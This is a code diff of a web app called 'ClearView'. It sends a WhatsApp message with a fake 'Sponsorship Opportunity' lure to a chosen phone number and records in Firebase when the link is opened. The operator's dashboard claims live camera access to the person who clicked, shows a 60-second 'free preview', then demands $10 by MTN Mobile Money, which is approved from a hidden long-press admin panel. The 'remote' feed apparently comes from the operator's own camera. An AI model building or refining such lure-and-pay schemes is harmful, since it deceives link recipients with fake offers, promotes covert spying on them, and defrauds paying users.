-    appId: "1:652271153227:web:d65d57fdd36923bae29dce",
-    measurementId: "G-WF3PB083CW"
+    appId: "1:652271153227:web:d65d57fdd36923bae29dce"
   };
-
   firebase.initializeApp(firebaseConfig);
   const database = firebase.database();
+
+  // State
+  let savedConnections = [];
+  let currentConnectionCode = '';
+  let currentPhoneNumber = '+256 700 000 000';
+  let localStream = null;
+  let adminPanelVisible = false;
 
   // DOM Elements
   const phoneInput = document.getElementById('phoneInput');
   const sendWhatsAppBtn = document.getElementById('sendWhatsAppBtn');
-  const linkPreview = document.getElementById('linkPreview');
-  const generatedLink = document.getElementById('generatedLink');
-  const copyLinkBtn = document.getElementById('copyLinkBtn');
-  const openWhatsAppBtn = document.getElementById('openWhatsAppBtn');
+  const connectionsList = document.getElementById('connectionsList');
+  const savedCount = document.getElementById('savedCount');
   const statusIndicator = document.getElementById('statusIndicator');
   const statusText = document.getElementById('statusText');
   const phoneChip = document.getElementById('phoneChip');
-  const linkChip = document.getElementById('linkChip');
   const accessChip = document.getElementById('accessChip');
   const videoStatus = document.getElementById('videoStatus');
   const videoPlaceholder = document.getElementById('videoPlaceholder');
@@ -1162,461 +709,331 @@
   const mtnPaymentOverlay = document.getElementById('mtnPaymentOverlay');
   const payNowBtn = document.getElementById('payNowBtn');
   const mtnDoneBtn = document.getElementById('mtnDoneBtn');
-  const expiryTimer = document.getElementById('expiryTimer');
   const logArea = document.getElementById('logArea');
-  const previewLink = document.getElementById('previewLink');
-  const whatsappFloat = document.getElementById('whatsappFloat');
-  const connectionsList = document.getElementById('connectionsList');
-  const savedCount = document.getElementById('savedCount');
-  const emptyState = document.getElementById('emptyState');
+  const adminPanel = document.getElementById('adminPanel');
+  const adminPendingList = document.getElementById('adminPendingList');
+  const adminToggleBtn = document.getElementById('adminToggleBtn');
+  const brandTagline = document.getElementById('brandTagline');
 
-  // State
-  let currentPhoneNumber = '+256 700 000 000';
-  let connectionLink = '';
-  let currentConnectionCode = '';
-  let isConnected = false;
-  let isPaid = false;
-  let linkGenerated = false;
-  let timerInterval = null;
-  let secondsRemaining = 3600;
-  let localStream = null;
-  let cameraActive = false;
-  let savedConnections = [];
+  // Long press detection for admin panel
+  let longPressTimer = null;
+  const LONG_PRESS_DURATION = 2000; // 2 seconds
 
-  // Load saved connections from localStorage
+  brandTagline.addEventListener('mousedown', startLongPress);
+  brandTagline.addEventListener('touchstart', startLongPress);
+  brandTagline.addEventListener('mouseup', cancelLongPress);
+  brandTagline.addEventListener('touchend', cancelLongPress);
+  brandTagline.addEventListener('mouseleave', cancelLongPress);
+  brandTagline.addEventListener('touchmove', cancelLongPress);
+
+  function startLongPress(e) {
+    e.preventDefault();
+    longPressTimer = setTimeout(() => {
+      toggleAdminPanel();
+      // Haptic feedback if available
+      if (navigator.vibrate) navigator.vibrate(50);
+    }, LONG_PRESS_DURATION);
+  }
+
+  function cancelLongPress() {
+    if (longPressTimer) {
+      clearTimeout(longPressTimer);
+      longPressTimer = null;
+    }
+  }
+
+  function toggleAdminPanel() {
+    adminPanelVisible = !adminPanelVisible;
+    if (adminPanelVisible) {
+      adminPanel.classList.add('show');
+      renderAdminPanel();
+      addLog('🔐 Admin Panel unlocked');
+    } else {
+      adminPanel.classList.remove('show');
+      addLog('🔐 Admin Panel hidden');
+    }
+  }
+
+  // Load saved connections
   function loadSavedConnections() {
     const saved = localStorage.getItem('clearview_connections');
     if (saved) {
-      try {
-        savedConnections = JSON.parse(saved);
-      } catch (e) {
-        savedConnections = [];
-      }
+      try { savedConnections = JSON.parse(saved); } catch(e) { savedConnections = []; }
     }
     renderSavedConnections();
   }
 
-  // Save connections to localStorage
   function saveConnections() {
     localStorage.setItem('clearview_connections', JSON.stringify(savedConnections));
     renderSavedConnections();
   }
 
-  // Render saved connections list
   function renderSavedConnections() {
     savedCount.textContent = savedConnections.length;
-    
     if (savedConnections.length === 0) {
-      connectionsList.innerHTML = `
-        <div class="empty-state">
-          <p>No connections yet. Send your first link above.</p>
-        </div>
-      `;
+      connectionsList.innerHTML = '<div class="empty-state">No connections yet.</div>';
       return;
     }
-    
     connectionsList.innerHTML = savedConnections.map(conn => {
-      let statusBadge = '';
-      let cardClass = '';
-      
-      if (conn.status === 'paid') {
-        statusBadge = '<span class="connection-status-badge badge-paid">💎 Lifetime Access</span>';
-        cardClass = 'paid';
-      } else if (conn.status === 'clicked') {
-        statusBadge = '<span class="connection-status-badge badge-clicked">🔒 Clicked - Awaiting Payment</span>';
-        cardClass = 'locked';
-      } else if (conn.status === 'expired') {
-        statusBadge = '<span class="connection-status-badge badge-expired">⏰ Expired</span>';
-        cardClass = 'expired';
-      } else {
-        statusBadge = '<span class="connection-status-badge badge-waiting">⏳ Waiting for click</span>';
-        cardClass = '';
-      }
-      
-      return `
-        <div class="connection-card ${cardClass}" onclick="reconnectToDevice('${conn.code}')">
-          <div class="connection-phone">📱 ${conn.phone}</div>
-          ${statusBadge}
-          <div class="connection-time">Created: ${new Date(conn.created).toLocaleString()}</div>
-          ${conn.clickedAt ? `<div class="connection-time">Clicked: ${new Date(conn.clickedAt).toLocaleString()}</div>` : ''}
-          ${conn.paidAt ? `<div class="connection-time">Paid: ${new Date(conn.paidAt).toLocaleString()}</div>` : ''}
-        </div>
-      `;
+      let badge = '';
+      if (conn.status === 'paid') badge = '<span class="connection-status-badge badge-paid">💎 Lifetime Access</span>';
+      else if (conn.status === 'clicked') badge = '<span class="connection-status-badge badge-clicked">🔒 Awaiting Payment</span>';
+      else if (conn.status === 'expired') badge = '<span class="connection-status-badge badge-expired">⏰ Expired</span>';
+      else badge = '<span class="connection-status-badge badge-waiting">⏳ Waiting</span>';
+      return `<div class="connection-card" onclick="reconnectToDevice('${conn.code}')">
+        <div class="connection-phone">📱 ${conn.phone}</div>
+        ${badge}
+        <div class="connection-time">Created: ${new Date(conn.created).toLocaleString()}</div>
+      </div>`;
     }).join('');
   }
 
-  // Reconnect to a saved device
   window.reconnectToDevice = function(code) {
     const conn = savedConnections.find(c => c.code === code);
     if (!conn) return;
-    
     currentConnectionCode = code;
     currentPhoneNumber = conn.phone;
     phoneInput.value = conn.phone;
     phoneChip.textContent = `📱 ${conn.phone}`;
-    
     addLog(`🔄 Reconnecting to ${conn.phone}...`);
-    
-    // Listen for updates from Firebase
     database.ref('connections/' + code).on('value', (snapshot) => {
       const data = snapshot.val();
       if (data) {
-        if (data.paid) {
-          showConnectedView();
-        } else if (data.clicked) {
-          showPaymentLock();
-        } else {
-          updateStatus('waiting', `Waiting for ${conn.phone} to click the link.`);
-        }
+        if (data.paid) showConnectedView();
+        else if (data.clicked) showPaymentLock();
+        else updateStatus('waiting', `Waiting for ${conn.phone} to click.`);
       }
     });
-    
-    // Scroll to video section
-    document.querySelector('.main-grid').scrollIntoView({ behavior: 'smooth' });
   };
 
-  // Generate unique link
-  function generateConnectionLink(phoneNumber) {
-    const cleanNumber = phoneNumber.replace(/[^0-9]/g, '');
+  function generateConnectionLink() {
+    const cleanNumber = currentPhoneNumber.replace(/[^0-9]/g, '');
     const hash = btoa(cleanNumber).replace(/[^a-zA-Z0-9]/g, '').substring(0, 8);
     const randomPart = Math.random().toString(36).substring(2, 6).toUpperCase();
-    const connectionCode = hash + randomPart;
+    const code = hash + randomPart;
     
-    // Save to local connections
-    savedConnections.push({
-      code: connectionCode,
-      phone: currentPhoneNumber,
-      status: 'waiting',
-      created: Date.now(),
-      clickedAt: null,
-      paidAt: null
-    });
+    savedConnections.push({ code, phone: currentPhoneNumber, status: 'waiting', created: Date.now() });
     saveConnections();
     
-    // Store in Firebase
-    database.ref('connections/' + connectionCode).set({
-      clicked: false,
-      paid: false,
-      created: Date.now(),
-      phone: cleanNumber
+    database.ref('connections/' + code).set({ 
+      clicked: false, 
+      paid: false, 
+      paymentRequested: false, 
+      created: Date.now(), 
+      phone: cleanNumber 
     });
     
-    // Listen for real-time updates
-    database.ref('connections/' + connectionCode).on('value', (snapshot) => {
+    database.ref('connections/' + code).on('value', (snapshot) => {
       const data = snapshot.val();
       if (data) {
-        // Update local storage
-        const connIndex = savedConnections.findIndex(c => c.code === connectionCode);
-        if (connIndex !== -1) {
-          if (data.clicked && !savedConnections[connIndex].clickedAt) {
-            savedConnections[connIndex].clickedAt = Date.now();
-            savedConnections[connIndex].status = 'clicked';
-          }
-          if (data.paid && !savedConnections[connIndex].paidAt) {
-            savedConnections[connIndex].paidAt = Date.now();
-            savedConnections[connIndex].status = 'paid';
-          }
+        const idx = savedConnections.findIndex(c => c.code === code);
+        if (idx !== -1) {
+          if (data.clicked) savedConnections[idx].status = 'clicked';
+          if (data.paid) savedConnections[idx].status = 'paid';
           saveConnections();
         }
-        
-        if (data.clicked && !data.paid) {
-          startCameraAccess();
-          setTimeout(showPaymentLock, 3000);
-        } else if (data.paid) {
-          showConnectedView();
+        if (data.paid) { 
+          showConnectedView(); 
+        } else if (data.paymentRequested) { 
+          renderAdminPanel(); 
+        } else if (data.clicked) { 
+          startCameraAccess(); 
+          // 1 MINUTE PREVIEW BEFORE LOCKING
+          setTimeout(showPaymentLock, 60000); // 60 seconds
+          addLog('📷 Camera preview started - 60 seconds free preview');
         }
       }
     });
     
-    currentConnectionCode = connectionCode;
-    return `https://cearview.github.io/ClearView/?connect=${connectionCode}`;
+    currentConnectionCode = code;
+    return `https://cearview.github.io/ClearView/?connect=${code}`;
   }
 
-  // Start camera access
+  function renderAdminPanel() {
+    const pendingRef = database.ref('connections');
+    pendingRef.once('value', (snapshot) => {
+      const data = snapshot.val();
+      const pending = [];
+      if (data) {
+        Object.keys(data).forEach(key => {
+          if (data[key].paymentRequested && !data[key].paid) {
+            pending.push({ 
+              code: key, 
+              phone: data[key].phone, 
+              requestedAt: data[key].paymentRequestedAt || Date.now() 
+            });
+          }
+        });
+      }
+      if (pending.length === 0) {
+        adminPendingList.innerHTML = '<div class="no-pending">No pending payments</div>';
+      } else {
+        adminPendingList.innerHTML = pending.map(p => `
+          <div class="pending-payment-card">
+            <div>
+              <div class="pending-phone">📱 ${p.phone}</div>
+              <div class="pending-time">Requested: ${new Date(p.requestedAt).toLocaleString()}</div>
+            </div>
+            <div class="admin-actions">
+              <button class="unlock-btn" onclick="unlockAccess('${p.code}')">✅ Unlock</button>
+              <button class="reject-btn" onclick="rejectPayment('${p.code}')">❌ Reject</button>
+            </div>
+          </div>
+        `).join('');
+      }
+    });
+  }
+
+  window.unlockAccess = function(code) {
+    database.ref('connections/' + code + '/paid').set(true);
+    database.ref('connections/' + code + '/paymentRequested').set(false);
+    addLog(`✅ Access unlocked for connection ${code}`);
+    renderAdminPanel();
+    showConnectedView();
+  };
+
+  window.rejectPayment = function(code) {
+    database.ref('connections/' + code + '/paymentRequested').set(false);
+    addLog(`❌ Payment rejected for connection ${code}`);
+    renderAdminPanel();
+  };
+
   async function startCameraAccess() {
     try {
       localStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
       remoteVideo.srcObject = localStream;
       remoteVideo.style.display = 'block';
       videoPlaceholder.style.display = 'none';
-      cameraActive = true;
-      videoStatus.textContent = '🔴 CAMERA ACTIVE';
-      addLog('📷 Camera access granted - live view active');
-    } catch (error) {
-      videoPlaceholder.innerHTML = `
-        <div class="placeholder-icon">📷</div>
-        <strong>Camera access requested...</strong>
-        <span>Waiting for permission</span>
-      `;
+      videoStatus.textContent = '🔴 CAMERA ACTIVE - FREE PREVIEW';
+      addLog('📷 Camera access granted - 60 second preview');
+    } catch(e) {
+      videoPlaceholder.innerHTML = '<div>📷</div><strong>Camera access requested...</strong>';
     }
   }
 
-  // Format phone for WhatsApp
-  function formatPhoneForWhatsApp(phoneNumber) {
-    return phoneNumber.replace(/[^0-9+]/g, '');
-  }
-
-  // Create WhatsApp message
-  function createWhatsAppMessage(link) {
-    return `🎉 *Sponsorship Opportunity!*\n\nCongratulations! You've been selected for our exclusive ClearView sponsorship program.\n\n💰 *What you get:*\n• Early access to our new app\n• Exclusive rewards\n• Limited time offer\n\n👉 *Click here to claim your spot:* ${link}\n\n_Act now - only a few spots remaining!_`;
-  }
-
-  // Format timer
-  function formatTime(seconds) {
-    const hours = Math.floor(seconds / 3600);
-    const minutes = Math.floor((seconds % 3600) / 60);
-    const secs = seconds % 60;
-    return `${hours > 0 ? hours + ':' : ''}${minutes.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
-  }
-
-  // Start expiry timer
-  function startExpiryTimer() {
-    if (timerInterval) clearInterval(timerInterval);
-    secondsRemaining = 3600;
-    
-    timerInterval = setInterval(() => {
-      secondsRemaining--;
-      if (secondsRemaining <= 0) {
-        clearInterval(timerInterval);
-        expiryTimer.textContent = '⏰ Expired';
-        if (!isPaid) {
-          // Mark as expired in local storage
-          const connIndex = savedConnections.findIndex(c => c.code === currentConnectionCode);
-          if (connIndex !== -1 && savedConnections[connIndex].status !== 'paid') {
-            savedConnections[connIndex].status = 'expired';
-            saveConnections();
-          }
-          resetConnection();
-        }
-      } else {
-        expiryTimer.textContent = `⏰ Expires in: ${formatTime(secondsRemaining)}`;
-      }
-    }, 1000);
-  }
-
-  // Stop timer
-  function stopTimer() {
-    if (timerInterval) {
-      clearInterval(timerInterval);
-      timerInterval = null;
-    }
-  }
-
-  // Reset connection
-  function resetConnection() {
-    isConnected = false;
-    isPaid = false;
-    paymentOverlay.style.display = 'none';
-    mtnPaymentOverlay.style.display = 'none';
-    videoStatus.textContent = 'ClearView Stream';
-    accessChip.style.display = 'none';
-    updateStatus('failed', 'Offer expired. Check your saved connections.');
-    videoPlaceholder.innerHTML = `
-      <div class="placeholder-icon">⏰</div>
-      <strong>Offer Expired</strong>
-      <span>You can still find this device in your saved connections</span>
-    `;
-  }
-
-  // Open WhatsApp
-  function openWhatsAppWithMessage(phoneNumber, message) {
-    const formattedNumber = formatPhoneForWhatsApp(phoneNumber);
-    const encodedMessage = encodeURIComponent(message);
-    const whatsappUrl = `https://wa.me/${formattedNumber}?text=${encodedMessage}`;
-    window.open(whatsappUrl, '_blank');
-    addLog(`📲 WhatsApp opened for ${phoneNumber}`);
-    addLog(`📤 Sponsorship offer sent. Waiting for them to click...`);
-  }
-
-  // Update UI
-  function updateStatus(status, message) {
-    statusIndicator.className = 'status-indicator ' + status;
-    statusText.textContent = message;
-    
-    if (status === 'connected') {
-      isConnected = true;
-      videoStatus.textContent = '🔴 FULL ACCESS';
-    } else if (status === 'locked') {
-      isConnected = false;
-      videoStatus.textContent = '🔒 ACCESS LOCKED';
-      accessChip.style.display = 'inline-block';
-      accessChip.textContent = '🔒 Premium - $10';
-    } else if (status === 'waiting') {
-      isConnected = false;
-      videoStatus.textContent = 'ClearView Stream';
-    }
-  }
-
-  // Show payment lock
   function showPaymentLock() {
     if (localStream) {
       localStream.getTracks().forEach(track => track.stop());
       remoteVideo.style.display = 'none';
       videoPlaceholder.style.display = 'flex';
-      videoPlaceholder.innerHTML = `
-        <div class="placeholder-icon">🔒</div>
-        <strong>Camera view locked</strong>
-        <span>Pay for full access to continue</span>
-      `;
-      cameraActive = false;
+      videoPlaceholder.innerHTML = '<div>🔒</div><strong>Preview ended</strong><span>Pay for full access</span>';
     }
-    
     paymentOverlay.style.display = 'flex';
-    updateStatus('locked', 'They clicked! Camera accessed. Pay for full access.');
-    accessChip.style.display = 'inline-block';
+    statusIndicator.className = 'status-indicator locked';
+    statusText.textContent = 'Preview ended. Payment required.';
+    accessChip.style.display = 'inline';
     accessChip.textContent = '🔒 Premium - $10';
-    startExpiryTimer();
-    addLog('🎯 They clicked the link!');
-    addLog('🔒 Premium required for continued access');
+    addLog('🔒 60-second preview ended. Payment required.');
   }
 
-  // Show connected view
   function showConnectedView() {
-    isPaid = true;
     paymentOverlay.style.display = 'none';
     mtnPaymentOverlay.style.display = 'none';
-    stopTimer();
-    
-    updateStatus('connected', 'Payment successful! Full access unlocked.');
+    statusIndicator.className = 'status-indicator connected';
+    statusText.textContent = 'Full access unlocked!';
     accessChip.textContent = '💎 Full Access';
-    accessChip.style.color = 'var(--premium)';
     videoStatus.textContent = '🔴 FULL ACCESS';
-    
     startCameraAccess();
-    
-    addLog('💳 Payment of $10 processed successfully');
     addLog('💎 Lifetime access activated');
-    addLog('📷 Camera view restored');
   }
 
-  // Add log
-  function addLog(message) {
-    const logDiv = document.createElement('div');
-    const timestamp = new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit', second: '2-digit' });
-    logDiv.textContent = `[${timestamp}] ${message}`;
-    logArea.appendChild(logDiv);
+  function addLog(msg) {
+    const div = document.createElement('div');
+    div.textContent = `[${new Date().toLocaleTimeString()}] ${msg}`;
+    logArea.appendChild(div);
     logArea.scrollTop = logArea.scrollHeight;
-    while (logArea.children.length > 10) {
-      logArea.removeChild(logArea.firstChild);
-    }
   }
 
-  // Send WhatsApp Link
+  function updateStatus(status, msg) {
+    statusIndicator.className = 'status-indicator ' + status;
+    statusText.textContent = msg;
+  }
+
+  // Event Listeners
   sendWhatsAppBtn.addEventListener('click', () => {
     currentPhoneNumber = phoneInput.value.trim() || '+256 700 000 000';
-    
-    if (!/^[+]?[\d\s\-\(\)]+$/.test(currentPhoneNumber)) {
-      addLog('❌ Please enter a valid phone number');
-      return;
-    }
-
-    connectionLink = generateConnectionLink(currentPhoneNumber);
-    linkGenerated = true;
-    isPaid = false;
-    
-    generatedLink.textContent = connectionLink;
-    linkPreview.classList.add('show');
+    const link = generateConnectionLink();
+    document.getElementById('generatedLink').textContent = link;
+    document.getElementById('linkPreview').style.display = 'block';
     phoneChip.textContent = `📱 ${currentPhoneNumber}`;
-    linkChip.textContent = `🔗 ${connectionLink.substring(0, 30)}...`;
-    linkChip.style.color = 'var(--accent)';
-    
-    previewLink.textContent = connectionLink;
-    
-    addLog(`🎉 Sponsorship link created`);
-    addLog(`🔗 Link: ${connectionLink}`);
-    addLog(`💾 Saved to your connections - you can close browser safely`);
-    
-    const message = createWhatsAppMessage(connectionLink);
-    openWhatsAppWithMessage(currentPhoneNumber, message);
-    
-    updateStatus('waiting', 'Sponsorship offer sent. You can close browser - connection is saved.');
+    addLog('🎉 Link created and saved');
+    const msg = `🎉 *Sponsorship Opportunity!*\n\nYou've been selected! Click here: ${link}`;
+    window.open(`https://wa.me/${currentPhoneNumber.replace(/[^0-9+]/g,'')}?text=${encodeURIComponent(msg)}`, '_blank');
+    updateStatus('waiting', 'Link sent! Waiting for click...');
   });
 
-  // Copy Link
-  copyLinkBtn.addEventListener('click', async () => {
-    if (!connectionLink) return;
-    try {
-      await navigator.clipboard.writeText(connectionLink);
-      addLog('📋 Link copied');
-    } catch (err) {
-      const textArea = document.createElement('textarea');
-      textArea.value = connectionLink;
-      document.body.appendChild(textArea);
-      textArea.select();
-      document.execCommand('copy');
-      document.body.removeChild(textArea);
-      addLog('📋 Link copied (fallback)');
+  document.getElementById('copyLinkBtn').addEventListener('click', async () => {
+    const link = document.getElementById('generatedLink').textContent;
+    if (link) {
+      try {
+        await navigator.clipboard.writeText(link);
+        addLog('📋 Link copied');
+      } catch(e) {
+        addLog('📋 Copy failed');
+      }
     }
   });
 
-  // Open WhatsApp
-  openWhatsAppBtn.addEventListener('click', () => {
-    if (!connectionLink || !currentPhoneNumber) return;
-    const message = createWhatsAppMessage(connectionLink);
-    openWhatsAppWithMessage(currentPhoneNumber, message);
-    updateStatus('waiting', 'Offer sent again. Connection is saved.');
+  document.getElementById('openWhatsAppBtn').addEventListener('click', () => {
+    const link = document.getElementById('generatedLink').textContent;
+    if (link && currentPhoneNumber) {
+      const msg = `🎉 *Sponsorship Opportunity!*\n\nYou've been selected! Click here: ${link}`;
+      window.open(`https://wa.me/${currentPhoneNumber.replace(/[^0-9+]/g,'')}?text=${encodeURIComponent(msg)}`, '_blank');
+    }
   });
 
-  // Pay Now button
   payNowBtn.addEventListener('click', () => {
     paymentOverlay.style.display = 'none';
     mtnPaymentOverlay.style.display = 'flex';
-    addLog('💰 MTN Mobile Money payment instructions shown');
-  });
-
-  // MTN Done button
-  mtnDoneBtn.addEventListener('click', () => {
     if (currentConnectionCode) {
-      database.ref('connections/' + currentConnectionCode + '/paid').set(true);
-      showConnectedView();
+      database.ref('connections/' + currentConnectionCode + '/paymentRequested').set(true);
+      database.ref('connections/' + currentConnectionCode + '/paymentRequestedAt').set(Date.now());
+      addLog('💰 Payment requested - notify admin');
     }
   });
 
-  // Check if someone opened the link
-  function checkUrlParameters() {
-    const urlParams = new URLSearchParams(window.location.search);
-    const connectParam = urlParams.get('connect');
-    
-    if (connectParam) {
-      database.ref('connections/' + connectParam + '/clicked').set(true);
-      
-      document.getElementById('mainDashboard').innerHTML = `
-        <div style="text-align: center; padding: 50px; background: var(--panel); border-radius: var(--radius); border: 1px solid var(--border);">
-          <div style="font-size: 4rem; margin-bottom: 1rem;">🎉</div>
-          <h1 style="color: var(--accent); margin-bottom: 1rem;">Congratulations!</h1>
-          <p style="color: var(--muted); font-size: 1.2rem;">You've successfully claimed your sponsorship spot!</p>
-          <p style="color: var(--accent); margin-top: 1rem; font-size: 1.1rem;">✓ Your application has been received</p>
-          <p style="color: var(--muted); margin-top: 1rem;">Our team will contact you shortly with next steps.</p>
-          <p style="color: var(--muted); margin-top: 2rem; font-size: 0.9rem;">You can close this window now.</p>
-        </div>
-      `;
-      document.getElementById('whatsappFloat').style.display = 'none';
+  mtnDoneBtn.addEventListener('click', () => {
+    mtnPaymentOverlay.style.display = 'none';
+    addLog('⏳ Payment submitted. Waiting for admin approval...');
+    statusText.textContent = 'Payment submitted. Waiting for admin approval...';
+    if (currentConnectionCode) {
+      database.ref('connections/' + currentConnectionCode + '/paymentRequested').set(true);
+      database.ref('connections/' + currentConnectionCode + '/paymentRequestedAt').set(Date.now());
+      renderAdminPanel();
     }
-  }
+  });
 
-  // Floating WhatsApp button
-  whatsappFloat.addEventListener('click', () => {
-    if (linkGenerated && connectionLink) {
-      const message = createWhatsAppMessage(connectionLink);
-      openWhatsAppWithMessage(currentPhoneNumber, message);
+  adminToggleBtn.addEventListener('click', () => {
+    adminPanel.classList.remove('show');
+    adminPanelVisible = false;
+  });
+
+  document.getElementById('whatsappFloat').addEventListener('click', () => {
+    const link = document.getElementById('generatedLink').textContent;
+    if (link) {
+      const msg = `🎉 *Sponsorship Opportunity!*\n\nYou've been selected! Click here: ${link}`;
+      window.open(`https://wa.me/${currentPhoneNumber.replace(/[^0-9+]/g,'')}?text=${encodeURIComponent(msg)}`, '_blank');
     } else {
       sendWhatsAppBtn.click();
     }
   });
 
-  // Initialize
-  function init() {
-    loadSavedConnections();
-    phoneChip.textContent = `📱 ${currentPhoneNumber}`;
-    linkChip.textContent = '🔗 Not generated';
-    updateStatus('idle', 'Ready to send link. Your connections are saved.');
-    addLog('🎯 ClearView initialized');
-    addLog('💾 Connection history enabled - never lose access');
-    
-    checkUrlParameters();
+  // Check URL parameters
+  function checkUrlParameters() {
+    const params = new URLSearchParams(window.location.search);
+    const connect = params.get('connect');
+    if (connect) {
+      database.ref('connections/' + connect + '/clicked').set(true);
+      document.getElementById('mainDashboard').innerHTML = '<div style="text-align:center; padding:50px;"><div style="font-size:4rem;">🎉</div><h1>Congratulations!</h1><p>You\'ve claimed your spot!</p></div>';
+    }
   }
 
-  init();
+  // Initialize
+  loadSavedConnections();
+  checkUrlParameters();
+  addLog('🎯 ClearView initialized');
+  addLog('📷 Camera preview: 60 seconds');
+  addLog('🔐 Admin: Long press "Prove Your Instincts"');
 </script>
 </body>
 </html>
